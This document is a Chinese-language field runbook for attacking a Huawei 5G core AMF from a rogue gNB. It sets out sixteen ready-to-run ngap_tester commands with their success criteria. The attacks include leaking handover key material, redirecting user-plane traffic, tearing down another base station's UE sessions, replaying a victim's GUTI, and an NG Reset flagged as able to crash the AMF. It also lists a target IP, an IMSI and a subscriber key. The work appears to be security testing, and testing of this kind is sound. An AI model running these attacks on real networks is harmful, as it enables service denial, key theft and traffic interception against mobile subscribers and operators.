# 华为 AMF 操作手册（现场实测 · 黑盒）

文件：`deploy/操作手册_华为AMF.md`。测试机 **Ubuntu**。现场改不了代码，只按这里的命令跑。

合法 UERANSIM 和流氓 `ngap_tester` 是同一华为 AMF 上的两个 gNB，**共用源 IP** `13.254.241.142`。
华为 **AMF-UE-NGAP-ID 每次注册随机**。禁止 `sweep`。禁止菜单「Run attack CASE by id」。

**按编号一条一条做。已做过的跳过。破坏会话的打完必须重注册再读 AU。`ng-reset` 放最后。**

上场前已经核对过、容易踩的坑（已改手册）：

1. **同机不要开 `gtpu-sink`。** 合法 `nr-gnb` 已经占了 `13.254.241.142:2152`，sink 会 `Address already in use`。切面看 N3 pcap 里有没有 **TEID `0x11111111`**。
2. Path Switch / HO / chain-ps **必须带** `--teid 0x11111111`（默认 1 和 UERANSIM 第一路会话可能撞车）。
3. `HandoverCommand` 的 procedureCode 仍是 **12**（不是 13）。13 是打到目标侧的 `HandoverRequest`。
4. `sudo capture-*.sh` 之后 `evidence/` 仍应能给普通用户写（脚本已 chown）。解码：`./deploy/real-amf/decode-n2.sh` 不带参数=最新一份。

全部命令在**仓库根目录**（能同时 `ls deploy/extract-ue-ids.sh config/huawei.json`）。

```bash
git pull
chmod +x deploy/*.sh deploy/real-amf/*.sh
./deploy/selftest-encode.sh    # 不连 AMF，确认每条报文还能编出来
./deploy/field-check.sh        # 全绿再往下
```

---

## 黑盒怎么观测（每条攻击都用这一套）

华为 AMF 内部状态你看不到。能用的只有四路。**四路对不上就不要写「成功」**。

| 路 | 是什么 | 怎么开 |
|---|---|---|
| 1 终端 C | 流氓进程打印 | `./deploy/ngt.sh …` |
| 2 终端 A/B | 合法 gNB / UE 日志 | `run-gnb.sh` / `run-ue.sh` |
| 3 N2 pcap | 本机 ↔ `14.66.2.5` 的 SCTP/NGAP | 攻击**之前**开抓 |
| 4 会话/数据面 | AU 还在不在、tun、GTP-U | `observe.sh` / `check-up.sh` |

若华为给了少量 AMF 日志：只当第 5 路。搜 IMSI `460081111111113`、gNB `4660`、下面每条写的关键词。没有日志也能结案。

### 每条攻击的固定节奏

```text
1. 合法侧已注册（A/B 开着）
2. 终端 D：./deploy/real-amf/observe.sh before <攻击名>
3. 终端 F：sudo ./deploy/real-amf/capture-n2.sh <攻击名>     # 先开
4. （只有攻击 1 / 5 / 9）终端 G：sudo ./deploy/real-amf/capture-n3.sh <名>。**不要开 gtpu-sink**
5. 终端 C：打这一条
6. 立刻看 A/B/C
7. 终端 D：./deploy/real-amf/observe.sh after <攻击名>
8. 终端 F Ctrl-C，然后：./deploy/real-amf/decode-n2.sh
   终端 G 若开了：Ctrl-C，然后：./deploy/real-amf/decode-n3.sh
9. 按下表填记录。UE 若掉了：重跑 run-ue.sh，再 extract-ue-ids.sh
```

### N2 抓包（黑盒主证据）

合法 gNB 和流氓**同一源 IP**，pcap 里靠 **SCTP 端口 + 时间** 对齐终端 C。
`decode-n2.sh` 会打出 `procedureCode`、Info、AU。对照下面每条的「应出现的 proc」。

```bash
sudo ./deploy/real-amf/capture-n2.sh path-switch
./deploy/real-amf/decode-n2.sh          # 不带参数 = evidence/ 里最新一份 n2
```

| proc | 报文 |
|---|---|
| 21 | NGSetup |
| 25 | PathSwitch |
| 42 | UEContextReleaseRequest |
| 41 | UEContextRelease Command / Complete |
| 9 | ErrorIndication |
| 20 | NGReset |
| 12 | HandoverRequired |
| 13 | HandoverRequest / Ack |
| 11 | HandoverNotify |
| 15 | InitialUEMessage |
| 35 | RANConfigurationUpdate |
| 48 / 47 | UL / DL RAN Configuration Transfer |
| 24 | Paging |
| 30 | PDUSessionResourceNotify |
| 2 | CellTrafficTrace |
| 49 | UL RAN Status Transfer |
| 50 | UL UE-assoc NRPPa |

### N3 抓包（只为切面）

```bash
sudo ./deploy/real-amf/capture-n3.sh path-switch
./deploy/real-amf/decode-n3.sh          # 找 TEID 0x11111111（十进制 285217055）
```

同机 **不要** `gtpu-sink`（和合法 gNB 抢 2152）。切面成立 = pcap 里出现我们声明的 TEID，旧 TEID 变少；控制面有 NH 但没有新 TEID = 只泄密钥、没切面。

### 读 AU / GUTI

```bash
./deploy/extract-ue-ids.sh          # 不要 sudo；抄 amf-ngap-id
./deploy/extract-ue-ids.sh --guti   # InitialUE 两条才需要
```

GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过程的 N2 pcap 用 `decode-n2.sh` 看 5G-TMSI 那一段。

| 字段 | 填谁 |
|---|---|
| `amf-ngap-id` | `--amf-ue-id` / `--source-amf-ue-id` |
| AMF Set ID（10 bit） | `--amf-set-id 0x…` |
| AMF Pointer（6 bit） | `--amf-pointer 0x…` |
| 5G-TMSI（4 字节） | `--tmsi` 八位 hex，如 `c000019c` |

### 三条铁律

1. **不要用上次的 AU。** UE 一重注册就作废。
2. **不要把两条破坏性攻击叠在同一会话上**（Path Switch 后再打 Release = 攻击 9，不是攻击 2）。
3. **终端 C 无回 ≠ 失败。** Class-2 本来就常常不回攻击者。看 pcap 和受害侧。

### 现场不要做

| 不要 | 原因 |
|---|---|
| `sweep` | 华为 AU 随机 |
| 菜单 CASE id | AU 写死 1，N3 写死 `172.30.200.9` |
| `./run.sh`（Docker） | 连的是实验室核心网 |
| 停终端 A | 没有受害 UE，也看不到 Command 有没有打到合法 gNB |
| ping `8.8.8.8` | 内网常禁外网 ICMP |

---

## 共用准备（每条攻击前）

每个终端先 `cd` 到仓库根。

| 终端 | 作用 | 命令 | 停不停 |
|---|---|---|---|
| A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
| B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
| D | 读 AU / observe | 见上 | 用完即可 |
| F | N2 抓包 | `sudo ./deploy/real-amf/capture-n2.sh <名>` | 打完再停 |
| C | 只打当前这一条 | 见各节 | 打一条就退出 |
| G | N3 抓包 | 仅攻击 1 / 5 / 9：`capture-n3.sh`。不要 sink | 打完再停 |

终端 A：`NG Setup procedure is successful`。  
终端 B：`Registration is successful` + `PDU Session establishment is successful`，有 `uesimtun0`。

```bash
./deploy/ngt.sh sctp-ping
# 必须 SUCCESS，源 IP = 13.254.241.142
./deploy/ngt.sh ng-setup
# 必须 ACCEPTED。REJECT = 4660/PLMN/切片没开通，下面都不要打
```

华为允许多条 SCTP，**不要停终端 A**。

---

## 现场参数

| 项 | 值 |
|---|---|
| IMSI | `460081111111113` |
| KI | `1234567890abcde1234567890abcde12` |
| OPc | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF`（`UE1_OP_TYPE=OPC`） |
| PLMN | MCC `460` / MNC `08` |
| TAC | `1` |
| S-NSSAI | SST `1` / SD `010101` |
| AMF | `14.66.2.5:38412` |
| 本机源 IP | `13.254.241.142` |
| 合法 gNB-ID | `1` |
| 流氓 gNB-ID | `4660` |
| DNN | `huawei.com` |

写在 `deploy/real-amf/real-amf.env` 和 `config/huawei.json`。改完重启对应进程。

---

## 攻击顺序（按这个表往下）

| # | 命令 | 要 AU？ | 会拆 UE？ | 建议 |
|---|---|---|---|---|
| 1 | `path-switch` | 要 | 可能改绑 | 先做；做完重注册 |
| 2 | `ue-release` | 要 | 可能 | 新会话，不要叠 1 |
| 3 | `error-indication` | 要 | 可能 | 新会话 |
| 4 | `handover-required` | 要 | 可能 | 新会话 |
| 5 | `ho-window-inject` | 要 | 可能 | 新会话；开 N3 抓包 |
| 6 | `ran-config-update` | 否 | 否 | 可复用会话 |
| 7 | `ul-ran-config-transfer` | 否 | 否 | 看终端 A |
| 8 | `initial-ue` | GUTI | 可能搅乱 | 先 `--guti` |
| 9 | `chain-ps-release` | 要 | 是 | 新会话 |
| 10 | `chain-initue-release` | GUTI+AU | 可能 | 先 `--guti` |
| 11 | `handover-notify` | 要 | 可能 | Class-2 |
| 12 | `pdu-notify` | 要 | 少见 | Class-2 |
| 13 | `cell-trace` | 要 | 少见 | Class-2 |
| 14 | `ul-ran-status` | 要 | 少见 | Class-2 |
| 15 | `ul-nrppa` | 要 | 少见 | Class-2 |
| 16 | `ng-reset` | 要 | 可能 + **可能打挂 AMF** | **最后做** |

11–15 若 UE 还活着、AU 没变，可以同一会话连打，每条仍要单独抓 N2、单独填表。

下面每条都是：命令 → 黑盒看什么 → 记录。`<AU>` 一律换成**这一次** `extract-ue-ids.sh` 的 `amf-ngap-id`。

---

## 攻击 1：Path Switch

流氓声称自己是新 serving，要 {NH,NCC}，并把下行 N3 指到本机。

**前提：** 新注册。开 N3 抓包。**不要开 gtpu-sink。**

```bash
./deploy/real-amf/observe.sh before path-switch
# 终端 F
sudo ./deploy/real-amf/capture-n2.sh path-switch
# 终端 G
sudo ./deploy/real-amf/capture-n3.sh path-switch
# 终端 C
mkdir -p evidence
./deploy/ngt.sh --evidence evidence/huawei-path-switch.jsonl \
    path-switch --source-amf-ue-id <AU> --pdu-sessions 1 --teid 0x11111111
```

`--attacker-ip` 默认用 `huawei.json` 的 `bind_ip`（`13.254.241.142`），不要改成 172.30。

**黑盒看什么**

| 路 | 成功 | 挡住 / 无效 |
|---|---|---|
| 终端 C | `CROSS-gNB DISCLOSURE CONFIRMED` + `LEAKED KEY MATERIAL: NCC=… NH=…` | `PathSwitchRequestFailure` / ErrorIndication / `no reply` |
| 终端 C 另 | `LEAKED UPF N3 ENDPOINT`（有则抄） | 只有 `ack-transfer (no UL-TNL…)` = ACK 了但没泄 UPF |
| N2 pcap | 上行 proc **25**，下行 `PathSwitchRequestAcknowledge` | 下行 Failure / Error / 无下行 |
| N3 pcap | 出现 TEID `0x11111111`，旧 TEID 变少 | 只有旧 TEID |
| `check-up.sh --n3` | 2152 还在但 TEID 变了，或 ping 断 | 和打前一样 |
| AMF 日志 | Path Switch / gNB 4660 / 该 IMSI | 拒绝 / 无此 UE |

控制面有 NH、数据面没切：也算控制面成立（Open5GS 2.8 就是这样）。两层分开记。

```
日期 / AU:
C 整段（NCC/NH/N3）:
N2：有无 ACK（proc 25 下行）:
N3 有无 TEID 0x11111111:
结论（泄密钥 / 泄 N3 / 切面 / 挡住 / 无回）:
```

做完重注册。不要在这个 AU 上接着打 2。

---

## 攻击 2：UE Context Release

对别人的 AU 发 `UEContextReleaseRequest`。看会不会拆受害 UE。

**前提：** 新注册，**没打过** Path Switch。不要 sink。

```bash
./deploy/real-amf/observe.sh before ue-release
sudo ./deploy/real-amf/capture-n2.sh ue-release
./deploy/ngt.sh --evidence evidence/huawei-ue-release.jsonl \
    ue-release --amf-ue-id <AU>
```

不要加 `--ran-ue-id`（默认 1 是流氓本地 ID）。

**黑盒看什么**

| 路 | 跨 gNB 释放成立 | 挡住 / 无效 |
|---|---|---|
| 终端 C | 常 `(no reply to us)` | `ErrorIndication`；或自己收到 `UEContextReleaseCommand`（命令回弹） |
| 终端 A | 出现 Release / UE 被拆 / Radio link | 无变化 |
| 终端 B / observe | 掉注册、tun 没了、ue-list 空 | 还是同一 AU，tun 还在 |
| N2 pcap | 上行 proc **42**；**另一条 SCTP** 上下行出现 proc **41**（Command 打到合法 gNB） | 只有 42，或 42 后对流氓回 Error（proc 9） |
| AMF 日志 | 该 IMSI 上下文释放 | 拒绝 / unknown UE / not in this RAN |

C 无回 + A 出现 Release + UE 掉 = **成立**。  
C 回 Error + UE 还活 = **挡住**。  
C 回 Command + UE 还活 = 命令打回攻击者。  
C 无回 + UE 没变 = AU 错或静默丢，重读 AU 再打一次。

```
日期 / AU:
C 整行:
N2：42 之后 41 出现在哪条 SCTP（合法 / 流氓 / 没有）:
A / B / observe 打后:
结论:
```

---

## 攻击 3：Error Indication

对别人的 AU 发 `ErrorIndication`（cause=`unknown-local-UE-NGAP-ID`）。有的栈会当成本地 UE 出错并释放。

**前提：** 新会话。不要 sink。

```bash
./deploy/real-amf/observe.sh before error-indication
sudo ./deploy/real-amf/capture-n2.sh error-indication
./deploy/ngt.sh --evidence evidence/huawei-error-indication.jsonl \
    error-indication --amf-ue-id <AU>
```

**黑盒看什么**

| 路 | 成立（受害被拆） | 挡住 / 忽略 |
|---|---|---|
| 终端 C | 无回或随后有释放类报文 | ErrorIndication 回弹 / 无回且受害无变化 |
| 终端 A | Release / 掉 UE | 无变化 |
| observe | AU 没了、tun 没了 | 同一 AU |
| N2 pcap | 上行 proc **9**；合法侧随后 proc **41** | 只有 9，或 AMF 对流氓回 9 |
| AMF 日志 | 该 IMSI 释放 / unknown UE 处理后释放 | 丢弃 / 绑定检查失败 |

```
日期 / AU:
C:
N2：proc 9 之后合法侧有无 41:
A/B/observe:
结论（拆了 / 挡住 / 无回且无变化）:
```

---

## 攻击 4：Handover Required

流氓替受害 UE 发 `HandoverRequired`，目标写成**不存在的** gNB `0xABCDE`（默认）。看 AMF 会不会对别人的上下文开切换。

**前提：** 新会话。不要改 `--target-gnb-id`（这条就是「指向假目标」）。指向自己是攻击 5。

```bash
./deploy/real-amf/observe.sh before handover-required
sudo ./deploy/real-amf/capture-n2.sh handover-required
./deploy/ngt.sh --evidence evidence/huawei-ho-required.jsonl \
    handover-required --amf-ue-id <AU>
```

**黑盒看什么**

| 路 | AMF 接受了跨 gNB HO | 挡住 |
|---|---|---|
| 终端 C | 有回（Failure / Command / 其它）或长时间无回 | 明确 Failure / ErrorIndication |
| 终端 A | HO Command / 准备切换 / 随后 Release | 无变化 |
| 终端 B | 掉线或尝试切换失败 | 还注册 |
| N2 pcap | 上行 proc **12**；合法侧下行仍是 proc **12** 但 Info 为 `HandoverCommand`，或随后 41 | 只有 12 Required，或对流氓回 Failure |
| AMF 日志 | Handover / target 找不到 / 该 IMSI 进 HO | 拒绝 / UE 不属于该 gNB |

假目标常常以 Failure 收场——**Failure 也要抄 cause**，说明它有没有按 AU 找到了受害上下文。

```
日期 / AU:
C 整行:
N2：12 之后下行是什么、打到哪条 SCTP:
A/B 是否被搅动:
结论（按 AU 开了 HO / 挡住 / 无变化）:
```

---

## 攻击 5：HO-window inject

同一条 SCTP：`HandoverRequired`（目标=**自己 4660**）→ 等 `HandoverRequest` → Ack → 再塞 p21（RAN Status）和 p09（HandoverNotify）。

**前提：** 新会话。开 N3 抓包，**不要 sink**。

```bash
./deploy/real-amf/observe.sh before ho-window
sudo ./deploy/real-amf/capture-n2.sh ho-window
sudo ./deploy/real-amf/capture-n3.sh ho-window
./deploy/ngt.sh --evidence evidence/huawei-ho-window.jsonl \
    ho-window-inject --amf-ue-id <AU> --mode both --teid 0x11111111
```

**黑盒看什么**

| 路 | 窗口打开 | 打不开 |
|---|---|---|
| 终端 C | `got HandoverRequest`，打印 target-amf / target-ran | `NO HandoverRequest`（到此停止，下面 p21/p09 不会发） |
| 终端 C 随后 | `DownlinkRANStatusTransfer` = p21 中继；或合法侧被 Release | 只有 Ack，无后续 |
| N2 pcap | 12 → 13（HO Request 打到流氓）→ Ack → 49 和/或 11 | 只有 12，然后 Failure |
| 终端 A | 源侧 HO Command / 后来 Release | 无变化 |
| observe / N3 | UE 掉，或出现 TEID `0x11111111` | 同一 AU，没有新 TEID |
| AMF 日志 | HO prepare / target 4660 | 拒绝 HO / unknown target |

```
日期 / AU:
有无 HandoverRequest（C 打印的 target-amf）:
p21 是否看到 DownlinkRANStatusTransfer:
p09 之后 A/B 是否掉:
N2 时间线（12/13/11/49/41）:
结论:
```

`NO HandoverRequest` 就停，不要改参数连打。记「窗口未开」即可。

---

## 攻击 6：RAN Configuration Update（假 TAI / 寻呼）

流氓再声明一遍 TAC=1。看 AMF 会不会把寻呼也扇到 4660。

**前提：** 可复用会话（不拆 UE）。黑盒往往**触发不了下行寻呼**——没有寻呼也要记 ACK。

```bash
sudo ./deploy/real-amf/capture-n2.sh ran-config
./deploy/ngt.sh --evidence evidence/huawei-ran-config.jsonl \
    ran-config-update --listen 30
```

30 秒内若华为/核心网能给该 IMSI 推一条下行（有人配合就让他们做），你可能看到 `PAGING INTERCEPTED`。没人配合就等到超时。

**黑盒看什么**

| 路 | 拓扑声称被接受 | 挡住 |
|---|---|---|
| 终端 C | 打印 `RANConfigurationUpdateAcknowledge` 一类 ACK | Failure / 无 ack |
| 终端 C 30s | `[PAGING INTERCEPTED] 5G-S-TMSI=…` | 无 Paging（黑盒常见） |
| N2 pcap | 上行 proc **35**，下行 ACK；若有寻呼则 proc **24** 打到流氓 SCTP | Failure |
| 终端 A | 若有寻呼，合法侧也会收到 Paging | 无变化 |
| AMF 日志 | RAN config / TAI 更新 / Paging | 拒绝 |

```
日期:
C：ACK 还是 Failure:
有无 PAGING（有则抄 5G-S-TMSI）:
N2：35 下行；有无 24:
结论（声称被接受 / 挡住 / 接受但无寻呼可测）:
```

---

## 攻击 7：UL RAN Configuration Transfer（SON 盲中继）

让 AMF 把 SON/Xn 配置转到合法 gNB-ID `1`。看终端 A 会不会收到 `DownlinkRANConfigurationTransfer`。

**前提：** 合法 gNB 必须在。不要 AU。

```bash
sudo ./deploy/real-amf/capture-n2.sh son
./deploy/ngt.sh --evidence evidence/huawei-son.jsonl \
    ul-ran-config-transfer --target-gnb-id 1
```

**黑盒看什么**

| 路 | 盲中继成立 | 丢掉 |
|---|---|---|
| 终端 C | 打印已发送（Class-2） | — |
| 终端 A | `Unhandled NGAP` / RAN Configuration Transfer / 异常 | 完全无新日志 |
| N2 pcap | 上行 proc **48**（流氓）；随后 **47** 打到**另一条** SCTP（合法 gNB） | 只有 48 |
| AMF 日志 | SON / RAN config transfer / target gNB 1 | 无邻居 / 丢弃 |

```
日期:
终端 A 打后多了什么:
N2：48 之后有无 47、47 的目的 SCTP 是不是合法侧:
结论（中继到合法 gNB / 未中继）:
```

---

## 攻击 8：InitialUE（用 5G-S-TMSI 开新上下文）

不带 AU，用受害 GUTI 发 `InitialUEMessage`（明文 Service Request）。看 AMF 会不会另开一条上下文、回 NAS、改 serving。

**前提：** 先拿到 GUTI。UE 保持注册。

```bash
./deploy/extract-ue-ids.sh --guti
# 记下 SET / PTR / TMSI，以及当前 AU（对照用）
./deploy/real-amf/observe.sh before initial-ue
sudo ./deploy/real-amf/capture-n2.sh initial-ue
./deploy/ngt.sh --evidence evidence/huawei-initial-ue.jsonl \
    initial-ue --amf-set-id 0x<SET> --amf-pointer 0x<PTR> --tmsi <8hex>
```

若 C 立刻被拒且日志像完整性检查，**同一 GUTI 再打一次**（只加这一个开关）：

```bash
./deploy/ngt.sh --evidence evidence/huawei-initial-ue-int.jsonl \
    initial-ue --amf-set-id 0x<SET> --amf-pointer 0x<PTR> --tmsi <8hex> \
    --nas-integrity
```

**黑盒看什么**

| 路 | 有后续 | 丢掉 |
|---|---|---|
| 终端 C | `DownlinkNASTransport` / `InitialContextSetupRequest` / Service Reject；抄新 AU | `(no reply / Class-2)` |
| 终端 B | 掉线、Idle、重新 Service Request | 还 CM-CONNECTED |
| N2 pcap | 上行 proc **15**；下行 NAS / ICS / Service Reject | 只有 15 |
| observe | AU 变了或 ue-list 异常 | 同一 AU |
| AMF 日志 | Initial UE / 5G-S-TMSI / 新 NGAP-ID / Service Reject | unknown TMSI / integrity fail |

```
日期 / 旧 AU / set / ptr / tmsi:
C 回复:
学到的新 AU（有则抄）:
B / observe:
N2：15 之后下行是什么:
结论:
```

---

## 攻击 9：chain-ps-release

**同一条 SCTP**：先 Path Switch（改绑到流氓）再 Release。这是「1 成功之后再拆」的组合，**不要和攻击 2 当成同一条**。

**前提：** 新会话。开 N3 抓包，**不要 sink**。

```bash
./deploy/real-amf/observe.sh before chain-ps
sudo ./deploy/real-amf/capture-n2.sh chain-ps
sudo ./deploy/real-amf/capture-n3.sh chain-ps
./deploy/ngt.sh --evidence evidence/huawei-chain-ps.jsonl \
    chain-ps-release --source-amf-ue-id <AU> --pdu-sessions 1 --teid 0x11111111
```

**黑盒看什么**

| 路 | 链成功 | 半截 / 挡住 |
|---|---|---|
| 终端 C | step1 ACK 且有 NCC/NH；step3 `got UEContextReleaseCommand` | step1 无 ACK；或 step3 `NO UEContextReleaseCommand` |
| 终端 A/B | UE 掉、Idle | 还注册 |
| N2 pcap | 25 ACK → 42 → 41（Command 可能打给流氓，因其已改绑） | 停在 25 Failure，或 42 后 Error |
| observe | tun 没了 | 同一 AU |

```
日期 / AU:
step1（ACK/NH?）:
step3（有无 Command / 是否发了 Complete）:
A/B/observe:
结论:
```

---

## 攻击 10：chain-initue-release

同一条 SCTP：InitialUE（GUTI）→ 听下行学新 AU → 再 Release（默认先打旧 AU 再打学到的 AU）。

**前提：** `--guti` + 当前 AU。新会话。

```bash
./deploy/extract-ue-ids.sh --guti
./deploy/real-amf/observe.sh before chain-initue
sudo ./deploy/real-amf/capture-n2.sh chain-initue
./deploy/ngt.sh --evidence evidence/huawei-chain-initue.jsonl \
    chain-initue-release \
    --amf-set-id 0x<SET> --amf-pointer 0x<PTR> --tmsi <8hex> \
    --victim-amf-ue-id <AU> --release-target both
```

和攻击 8 一样，若明文 SR 被拒，加 `--nas-integrity` 再打一次（仍用新注册的 AU/GUTI）。

**黑盒看什么**

| 路 | 有学 AU / 有释放 | 中止 |
|---|---|---|
| 终端 C | `learned AU=…`；某个 target `got Command` | `ABORT: no release targets`；或两次都 NO Command |
| 终端 B | 掉线或短暂 Idle | 还在 |
| N2 pcap | 15 → 下行 NAS → 42 → 41 | 只有 15 |
| observe | AU 变或空 | 同一 AU |

```
日期 / 旧 AU / GUTI:
learned AU:
victim 那次有无 Command:
learned 那次有无 Command:
B/observe:
结论:
```

---

## 攻击 11：Handover Notify（裸 p09）

不先开 HO 窗，直接对 AU 发 `HandoverNotify`。OAI 上这条会让 AMF 把 Release 打到**合法 gNB**。

**前提：** 新会话（或 11–15 连打的第一条）。不要和攻击 5 叠。

```bash
./deploy/real-amf/observe.sh before ho-notify
sudo ./deploy/real-amf/capture-n2.sh ho-notify
./deploy/ngt.sh --evidence evidence/huawei-ho-notify.jsonl \
    handover-notify --amf-ue-id <AU>
```

**黑盒看什么**

| 路 | 跨 gNB 释放 | 忽略 |
|---|---|---|
| 终端 C | Class-2，4 秒内可能无回 | ErrorIndication |
| 终端 A | Release Command | 无变化 |
| observe | UE 掉 | 同一 AU |
| N2 pcap | 上行 proc **11**；合法侧随后 **41** | 只有 11 |

```
日期 / AU:
A 有无 Release:
observe:
N2：11 之后有无 41、在哪条 SCTP:
结论:
```

---

## 攻击 12：PDU Session Resource Notify

对 AU 发 Class-2 Notify。有的栈会按 AU 改绑 `ranUe`。

```bash
./deploy/real-amf/observe.sh before pdu-notify
sudo ./deploy/real-amf/capture-n2.sh pdu-notify
./deploy/ngt.sh --evidence evidence/huawei-pdu-notify.jsonl \
    pdu-notify --amf-ue-id <AU>
```

**黑盒看什么：** N2 上行 proc **30**；A/B/observe 有没有掉或会话异常；AMF 是否把 Notify 往 SMF 转（日志里 PDU session notify / 该 IMSI）。多数栈会忽略——**忽略也是结论**。

```
日期 / AU:
C 4 秒内有无回:
A/B/observe 有无变化:
N2：只有 30，还是后面有 Error / 改会话:
结论（改绑或拆会话 / 忽略）:
```

---

## 攻击 13：Cell Traffic Trace

对 AU 发 Trace，TCE 地址填本机。看会不会改受害 trace 状态或再绑。

```bash
./deploy/real-amf/observe.sh before cell-trace
sudo ./deploy/real-amf/capture-n2.sh cell-trace
./deploy/ngt.sh --evidence evidence/huawei-cell-trace.jsonl \
    cell-trace --amf-ue-id <AU>
```

**黑盒看什么：** N2 上行 proc **2**；A/B 通常不应掉线；AMF 日志搜 Trace / TCE / `13.254.241.142`。会话无变化 = 忽略。

```
日期 / AU:
会话还在?:
N2 proc 2 之后有无下行:
AMF 是否提到 TCE:
结论:
```

---

## 攻击 14：Uplink RAN Status Transfer（裸 p21）

不在 HO 窗里发 PDCP 状态。开源上常被「当前不在 HO」挡掉。对照攻击 5。

```bash
./deploy/real-amf/observe.sh before ul-ran-status
sudo ./deploy/real-amf/capture-n2.sh ul-ran-status
./deploy/ngt.sh --evidence evidence/huawei-ul-ran-status.jsonl \
    ul-ran-status --amf-ue-id <AU>
```

**黑盒看什么：** N2 上行 proc **49**；有无 `DownlinkRANStatusTransfer` 回给流氓；A/B 有无异常。预期多为忽略。

```
日期 / AU:
C 有无 DownlinkRANStatusTransfer:
会话:
N2:
结论（中继 / 忽略）:
```

---

## 攻击 15：Uplink UE-associated NRPPa

往受害定位会话塞占位 NRPPa。

```bash
./deploy/real-amf/observe.sh before ul-nrppa
sudo ./deploy/real-amf/capture-n2.sh ul-nrppa
./deploy/ngt.sh --evidence evidence/huawei-ul-nrppa.jsonl \
    ul-nrppa --amf-ue-id <AU>
```

**黑盒看什么：** N2 上行 proc **50**；有无下行 NRPPa；A/B 不应无故掉线。忽略是常见结论。

```
日期 / AU:
C 有无下行:
会话:
N2:
结论:
```

---

## 攻击 16：NG Reset（最后做）

部分 Reset，列表里带受害 AU。Open5GS 上**单包崩过 AMF**。做完立刻再 `sctp-ping` / `ng-setup`，看 AMF 还活着没有。

**前提：** 其它条都做完。新会话。

```bash
./deploy/real-amf/observe.sh before ng-reset
sudo ./deploy/real-amf/capture-n2.sh ng-reset
./deploy/ngt.sh --evidence evidence/huawei-ng-reset.jsonl \
    ng-reset --targets <AU>:1
```

若上面受害完全没变，**同一新 AU** 再打只带 AMF-ID 的变体（有的栈只在这条路径上全局查找）：

```bash
./deploy/ngt.sh --evidence evidence/huawei-ng-reset-amfonly.jsonl \
    ng-reset --targets <AU>
```

然后立刻：

```bash
./deploy/ngt.sh sctp-ping
./deploy/ngt.sh ng-setup
```

**黑盒看什么**

| 路 | 拆了 UE | 崩了 AMF | 挡住 |
|---|---|---|---|
| 终端 C | `NGResetAcknowledge` | 无回 / 关联断 | ACK 但受害还在 |
| 终端 A | UE 被拆；或 **NG 全断** | gNB 报 AMF 断 | 无变化 |
| observe | AU 空 | 连 N2 都没了 | 同一 AU |
| N2 pcap | 上行 proc **20**，下行 Ack；合法侧随后 41 或 Reset | 20 之后 AMF 不再回任何包 | 只有 20+Ack |
| 随后 sctp-ping | 仍 SUCCESS | **FAIL** | SUCCESS |
| AMF 日志 | Reset 该 UE / 进程没了 | core / restart | 作用域限制在发送方 gNB |

```
日期 / AU:
变体（AU:1 还是 只 AU）:
C:
随后 sctp-ping / ng-setup:
A/B/observe:
结论（挡住 / 拆该 UE / AMF 不可达）:
```

**不要**对一串 AU 连打 Reset。一次一条。

---

## 总记录表（华为是新靶，开源结论不能套）

| # | 攻击 | N2 上行 | AMF 回攻击者 | 合法 gNB | 受害 UE | 备注 |
|---|---|---|---|---|---|---|
| 0 | sctp-ping / ng-setup | 21 | | — | — | 源 IP= |
| 1 | path-switch | 25 | ACK? NH? | N3? | | |
| 2 | ue-release | 42 | | 有 41? | | |
| 3 | error-indication | 9 | | | | |
| 4 | handover-required | 12 | | | | |
| 5 | ho-window-inject | 12/13/11/49 | HO Request? | | | |
| 6 | ran-config-update | 35 | ACK? Paging? | | — | |
| 7 | ul-ran-config-transfer | 48 | — | 有 47? | — | |
| 8 | initial-ue | 15 | DL NAS? | | | GUTI= |
| 9 | chain-ps-release | 25+42 | | | | |
| 10 | chain-initue-release | 15+42 | learned AU? | | | |
| 11 | handover-notify | 11 | | 41? | | |
| 12 | pdu-notify | 30 | | | | |
| 13 | cell-trace | 2 | | | | |
| 14 | ul-ran-status | 49 | | | | |
| 15 | ul-nrppa | 50 | | | | |
| 16 | ng-reset | 20 | Ack? AMF 还活? | | | |

证据目录：`evidence/huawei-*.jsonl`、`evidence/n2-*.pcap`、`evidence/observe-*.txt`。

---

## 常见问题

| 现象 | 处理 |
|---|---|
| `sctp-ping` timeout，UERANSIM 却通 | `huawei.json` 的 `bind_ip` 必须是 `13.254.241.142`。华为允许多条 SCTP。查 `ip -4 addr` |
| `ng-setup` REJECT | PLMN/TAC/切片/gNB 4660 / 源 IP 未开通 |
| UE 认证失败 | IMSI/KI/OPc/PLMN；首次 SQN re-sync 正常 |
| 攻击「没反应」 | AU 过期或填成 1。重读 AU。看 N2 pcap 包出没出去 |
| `extract-ue-ids.sh` 空 | 注册完才抓的。直接无参跑（nr-cli）；或 `--watch` 时再重启 UE |
| 合法 UE 掉了还想打下一条 | 重新 `run-ue.sh`，重新读 AU |
| decode-n2 里分不清谁是流氓 | 对齐终端 C 的时间戳；流氓关联在 `ngt.sh` 期间才出现 |
| Class-2 终端 C 说 no NGAP | 正常。以 pcap + A/B 为准 |
| `selftest-encode.sh` 失败 | 不要打失败那条，先看打印 |
| `gtpu-sink` Address already in use | 预期。同机不要开 sink，改抓 N3 |
| `--guti` 看不到 imsi- | `run-ue.sh` 是 sudo 起的，脚本会再 sudo nr-cli；仍空就看终端 B 或注册 N2 |

菜单选 `7` Huawei AMF 也可以发主线，但 **AU 必须手填**。`ho-window-inject` / `initial-ue` / 两条 chain / `sctp-ping` **只有 CLI 有**。
